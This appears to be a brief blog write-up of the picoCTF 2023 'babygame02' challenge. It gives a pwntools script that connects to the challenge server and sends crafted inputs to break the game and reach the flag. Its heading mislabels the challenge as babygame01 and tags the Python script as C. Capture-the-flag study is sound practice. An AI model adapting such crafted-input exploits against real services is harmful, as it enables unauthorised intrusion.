---
title: Babygame2 PicoCTF 2023
published: Apr 1, 2023
language: English
---

## babygame01

**100 points**

AUTHOR: PALASH OSWAL

Description
Break the game and get the flag.
Welcome to BabyGame 02! Navigate around the map and see what you can find! The game is available to download here. There is no source available, so you'll have to figure your way around the map. You can connect with it using your port.

I enjoyed solving this challenge because it was very hard, and I needed to become even harder to solve it.

## Time to solve

using the script below you can get the flag and it is just that

```c
from pwn import *
p = remote('saturn.picoctf.net', your port number)
p.sendlineafter(b'\n', b'l\x61')
p.sendlineafter(b'\n', b'd'*47)
p.sendlineafter(b'\n', b'w'*5)
p.interactive()
```

> picoCTF{your flag}
